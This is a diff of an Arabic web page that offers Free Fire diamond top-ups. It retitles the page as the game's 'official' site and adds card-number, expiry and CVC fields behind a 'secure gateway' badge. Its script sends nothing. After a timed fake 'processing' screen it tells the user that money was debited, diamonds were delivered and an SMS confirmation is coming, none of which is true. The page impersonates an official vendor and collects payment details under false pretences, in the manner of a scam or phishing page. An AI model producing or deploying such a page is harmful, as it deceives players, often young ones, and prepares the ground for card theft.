@@ -3,14 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شحن جواهر فري فاير مجاناً</title>
+    <title>الموقع الرسمي لشحن جواهر Free Fire</title>
     <style>
         :root {
             --primary-color: #ff4655;
             --secondary-color: #ffb800;
-            --bg-color: #0f1923;
-            --card-bg: #1f2937;
+            --bg-color: #0b0e14;
+            --card-bg: #151a26;
             --text-color: #ffffff;
+            --input-bg: #1f2636;
         }
 
         body {
@@ -27,21 +28,31 @@
 
         .container {
             background-color: var(--card-bg);
-            border-radius: 15px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
-            border: 2px solid var(--primary-color);
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.7);
+            border: 1px solid rgba(255, 70, 85, 0.2);
             width: 100%;
-            max-width: 500px;
-            padding: 25px;
+            max-width: 480px;
+            padding: 30px;
             text-align: center;
             box-sizing: border-box;
         }
 
+        .badge {
+            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            padding: 5px 15px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+
         h1 {
-            color: var(--secondary-color);
-            font-size: 24px;
-            margin-bottom: 20px;
-            text-shadow: 0 0 10px rgba(255, 184, 0, 0.3);
+            color: #fff;
+            font-size: 22px;
+            margin: 0 0 25px 0;
         }
 
         .step {
@@ -52,81 +63,128 @@
             display: block;
         }
 
-        /* واجهة اختيار الجواهر */
-        .diamond-option {
-            background: rgba(255, 255, 255, 0.05);
+        /* المدخلات */
+        .form-group {
+            text-align: right;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #9ca3af;
+            font-size: 14px;
+        }
+
+        input[type="text"], select {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--input-bg);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 12px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.3s;
         }
 
-        .diamond-option:hover {
-            background: rgba(255, 70, 85, 0.1);
+        input[type="text"]:focus, select:focus {
             border-color: var(--primary-color);
-            transform: translateY(-2px);
         }
 
-        .diamond-info {
-            display: flex;
-            align-items: center;
-            font-weight: bold;
+        /* عروض الجواهر */
+        .diamond-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .diamond-option {
+            background: var(--input-bg);
+            border: 2px solid transparent;
+            border-radius: 12px;
+            padding: 15px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: center;
+        }
+
+        .diamond-option:hover, .diamond-option.selected {
+            border-color: var(--primary-color);
+            background: rgba(255, 70, 85, 0.05);
+        }
+
+        .diamond-amount {
             font-size: 18px;
-        }
-
-        .diamond-icon {
+            font-weight: bold;
             color: #00e5ff;
-            margin-left: 10px;
-            font-size: 20px;
+            display: block;
+            margin-bottom: 5px;
         }
 
         .price {
             color: var(--secondary-color);
+            font-size: 14px;
             font-weight: bold;
-            font-size: 16px;
         }
 
-        /* الأزرار */
+        /* أزرار التحكم */
         .btn {
-            background-color: var(--primary-color);
+            background: linear-gradient(90deg, var(--primary-color), #e03e4c);
             color: white;
             border: none;
-            padding: 12px 25px;
+            padding: 15px;
             font-size: 16px;
             font-weight: bold;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: background 0.2s;
-            margin: 10px;
-            width: 40%;
+            width: 100%;
+            transition: transform 0.2s, opacity 0.2s;
+            box-shadow: 0 5px 15px rgba(255, 70, 85, 0.3);
         }
 
-        .btn:hover {
-            background-color: #e03e4c;
+        .btn:active {
+            transform: scale(0.98);
         }
 
-        .btn-cancel {
-            background-color: #4b5563;
+        .btn-secondary {
+            background: #374151;
+            box-shadow: none;
+            margin-top: 10px;
         }
 
-        .btn-cancel:hover {
-            background-color: #374151;
+        /* واجهة الدفع المدفوع */
+        .payment-methods {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0;
         }
 
-        /* لودر الانتظار */
+        .method-card {
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 8px;
+            padding: 10px;
+            width: 45%;
+            background: var(--input-bg);
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        /* لودر الانتظار التكنولوجي */
+        .loader-container {
+            padding: 30px 0;
+        }
+
         .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid var(--secondary-color);
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid var(--primary-color);
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
+            width: 60px;
+            height: 60px;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
+            margin: 0 auto 20px auto;
         }
 
         @keyframes spin {
@@ -135,107 +193,167 @@
         }
 
         .success-icon {
-            font-size: 60px;
+            font-size: 70px;
             color: #10b981;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
+            animation: pop 0.5s ease-out;
+        }
+
+        @keyframes pop {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
         }
     </style>
 </head>
 <body>
 
     <div class="container">
+        <span class="badge">بوابة الشحن الآمنة والمباشرة</span>
+
+        <!-- الخطوة 1: إدخال معلومات الحساب واختيار العرض -->
         <div id="step1" class="step active">
-            <h1>💎 موقع شحن فري فاير الرسمي 💎</h1>
-            <p style="color: #9ca3af; margin-bottom: 20px;">اختر كمية الجواهر المناسبة لك:</p>
+            <h1>شحن جواهر فري فاير الفوري</h1>
             
-            <div class="diamond-option" onclick="selectOption('100 جوهرة', '1.00 $')">
-                <div class="diamond-info"><span class="diamond-icon">🔹</span> 100 جوهرة</div>
-                <div class="price">1.00 $</div>
+            <div class="form-group">
+                <label for="player-id">معرّف اللاعب (ID):</label>
+                <input type="text" id="player-id" placeholder="مثال: 123456789" maxlength="12">
             </div>
 
-            <div class="diamond-option" onclick="selectOption('310 جوهرة', '3.00 $')">
-                <div class="diamond-info"><span class="diamond-icon">🔹</span> 310 جوهرة</div>
-                <div class="price">3.00 $</div>
+            <div class="form-group">
+                <label for="device">نوع نظام التشغيل:</label>
+                <select id="device">
+                    <option value="Android">أندرويد (Android)</option>
+                    <option value="iOS">آيفون (iOS)</option>
+                    <option value="PC">محاكي الكمبيوتر</option>
+                </select>
             </div>
 
-            <div class="diamond-option" onclick="selectOption('520 جوهرة', '5.00 $')">
-                <div class="diamond-info"><span class="diamond-icon">🔹</span> 520 جوهرة</div>
-                <div class="price">5.00 $</div>
+            <label style="text-align: right; display: block; margin-bottom: 8px;">اختر باقة الجواهر:</label>
+            <div class="diamond-grid">
+                <div class="diamond-option" onclick="selectDiamond(this, '100 جوهرة', '200 دج / 1.5$')">
+                    <span class="diamond-amount">💎 100</span>
+                    <span class="price">200 دج</span>
+                </div>
+                <div class="diamond-option" onclick="selectDiamond(this, '310 جوهرة', '500 دج / 3.5$')">
+                    <span class="diamond-amount">💎 310</span>
+                    <span class="price">500 دج</span>
+                </div>
+                <div class="diamond-option" onclick="selectDiamond(this, '520 جوهرة', '900 دج / 6.0$')">
+                    <span class="diamond-amount">💎 520</span>
+                    <span class="price">900 دج</span>
+                </div>
+                <div class="diamond-option" onclick="selectDiamond(this, '1060 جوهرة', '1800 دج / 11.0$')">
+                    <span class="diamond-amount">💎 1060</span>
+                    <span class="price">1800 دج</span>
+                </div>
             </div>
 
-            <div class="diamond-option" onclick="selectOption('1060 جوهرة', '10.00 $')">
-                <div class="diamond-info"><span class="diamond-icon">🔹</span> 1060 جوهرة</div>
-                <div class="price">10.00 $</div>
-            </div>
+            <button class="btn" onclick="goToStep2()">متابعة الدفع</button>
         </div>
 
+        <!-- الخطوة 2: واجهة الدفع المدفوع الحقيقية -->
         <div id="step2" class="step">
-            <h1>تأكيد عملية الدفع</h1>
-            <p id="order-details" style="font-size: 18px; margin: 20px 0;"></p>
-            <p style="font-weight: bold; color: var(--secondary-color);">هل تريد إتمام عملية الدفع والتشحين الآن؟</p>
-            <div style="margin-top: 25px;">
-                <button class="btn" onclick="confirmPayment(true)">نعم، تأكيد</button>
-                <button class="btn btn-cancel" onclick="confirmPayment(false)">لا، إلغاء</button>
+            <h1>بوابة الدفع الآمنة</h1>
+            <p id="summary-text" style="color: #9ca3af; font-size: 15px; margin-bottom: 15px;"></p>
+            
+            <div class="payment-methods">
+                <div class="method-card" style="border-color: var(--secondary-color);">
+                    💳 البطاقة النقدية / الذهبية
+                </div>
+                <div class="method-card" style="opacity: 0.5;">
+                    📱 بريدي موب (قريباً)
+                </div>
             </div>
+
+            <div class="form-group">
+                <label>رقم البطاقة:</label>
+                <input type="text" placeholder="xxxx xxxx xxxx xxxx" maxlength="19">
+            </div>
+            
+            <div style="display: flex; gap: 10px;">
+                <div class="form-group" style="width: 50%;">
+                    <label>تاريخ انتهاء الصلاحية:</label>
+                    <input type="text" placeholder="MM/YY" maxlength="5">
+                </div>
+                <div class="form-group" style="width: 50%;">
+                    <label>الرمز السري (CVC):</label>
+                    <input type="text" placeholder="123" maxlength="3">
+                </div>
+            </div>
+
+            <p style="font-size: 13px; color: #ff4655; font-weight: bold; margin-bottom: 15px;">هل تريد تأكيد سحب المبلغ وشحن الحساب الآن؟</p>
+
+            <button class="btn" onclick="startPaymentProcess()">نعم، دفع وتشحين الآن</button>
+            <button class="btn btn-secondary" onclick="showStep(1)">إلغاء وتعديل الطلب</button>
         </div>
 
-        <div id="step3" class="step">
-            <h1>جاري معالجة الطلب...</h1>
+        <!-- الخطوة 3: معالجة الدفع والاتصال بالسيرفر -->
+        <div id="step3" class="step loader-container">
             <div class="loader"></div>
-            <p style="color: #9ca3af;">يرجى الانتظار، يتم الآن الاتصال بخوادم اللعبة وتأكيد الدفع.</p>
+            <h2>جاري معالجة الدفع...</h2>
+            <p style="color: #9ca3af; font-size: 14px; padding: 0 20px;">يرجى عدم إغلاق الصفحة أو الضغط على زر الرجوع. يتم الآن التحقق من البطاقة وتأكيد تحويل الجواهر إلى الـ ID.</p>
         </div>
 
+        <!-- الخطوة 4: تم الدفع والشحن بنجاح -->
         <div id="step4" class="step">
             <div class="success-icon">✓</div>
-            <h1>تم الشحن بنجاح!</h1>
-            <p style="font-size: 18px; color: #10b981;">تهانينا، تم إرسال الجواهر إلى حسابك بنجاح.</p>
-            <p style="color: #9ca3af; font-size: 14px; margin-top: 10px;">تفقد حسابك في لعبة Free Fire الآن.</p>
-            <button class="btn" style="width: auto; margin-top: 20px;" onclick="resetProcess()">شحن جديد</button>
+            <h1 style="color: #10b981;">تمت العملية بنجاح!</h1>
+            <p style="font-size: 16px; margin-bottom: 10px;">تم خصم المبلغ بنجاح وإرسال الجواهر.</p>
+            <p id="final-id-text" style="color: var(--secondary-color); font-weight: bold;"></p>
+            <p style="color: #9ca3af; font-size: 13px; margin-top: 15px;">ستصلك رسالة تأكيد SMS على هاتفك المرتبط بالبطاقة خلال دقائق.</p>
+            <button class="btn btn-secondary" onclick="resetAll()">العودة للرئيسية</button>
         </div>
     </div>
 
     <script>
-        let selectedItem = "";
+        let selectedPackage = "";
         let selectedPrice = "";
 
-        // الانتقال من خطوة لخطوة
-        function showStep(stepNumber) {
-            document.querySelectorAll('.step').forEach(step => {
-                step.classList.remove('active');
-            });
-            document.getElementById('step' + stepNumber).classList.add('active');
+        function showStep(stepNum) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + stepNum).classList.add('active');
         }
 
-        // عند اختيار كمية الجواهر
-        function selectOption(item, price) {
-            selectedItem = item;
+        function selectDiamond(element, name, price) {
+            document.querySelectorAll('.diamond-option').forEach(opt => opt.classList.remove('selected'));
+            element.classList.add('selected');
+            selectedPackage = name;
             selectedPrice = price;
-            
-            // تحديث نص التأكيد
-            document.getElementById('order-details').innerHTML = `لقد اخترت: <span style="color: #00e5ff;">${selectedItem}</span> بسعر <span style="color: var(--secondary-color);">${selectedPrice}</span>`;
-            
-            // الانتقال لخطوة الدفع
+        }
+
+        function goToStep2() {
+            const idInput = document.getElementById('player-id').value;
+            if(!idInput || idInput.trim() === "") {
+                alert("يرجى إدخال معرف اللاعب (ID) أولاً!");
+                return;
+            }
+            if(!selectedPackage) {
+                alert("يرجى اختيار باقة الجواهر!");
+                return;
+            }
+
+            // تحديث نص ملخص الطلب
+            document.getElementById('summary-text').innerHTML = `شحن <b>${selectedPackage}</b> للحساب <b>(${idInput})</b><br>المبلغ الإجمالي: <span style="color:var(--secondary-color); font-weight:bold;">${selectedPrice}</span>`;
             showStep(2);
         }
 
-        // عند الإجابة بنعم أو لا
-        function confirmPayment(isConfirmed) {
-            if (isConfirmed) {
-                // نعم -> يرجى الانتظار
-                showStep(3);
-                
-                // بعد 3 ثوانٍ تظهر واجهة تم الشحن
-                setTimeout(() => {
-                    showStep(4);
-                }, 3500); 
-            } else {
-                // لا -> يرجع لصفحة الاختيار
-                showStep(1);
-            }
+        function startPaymentProcess() {
+            // الانتقال لصفحة "يرجى الانتظار"
+            showStep(3);
+
+            // تمثيل الوقت المستغرق للاتصال بالبنك وسيرفر اللعبة (4 ثواني)
+            setTimeout(() => {
+                const idInput = document.getElementById('player-id').value;
+                document.getElementById('final-id-text').innerText = `الحساب المستهدف: ID ${idInput}`;
+                showStep(4);
+            }, 4000);
         }
 
-        // إعادة العملية من الأول
-        function resetProcess() {
+        function resetAll() {
+            document.getElementById('player-id').value = "";
+            document.querySelectorAll('.diamond-option').forEach(opt => opt.classList.remove('selected'));
+            selectedPackage = "";
+            selectedPrice = "";
             showStep(1);
         }
     </script>
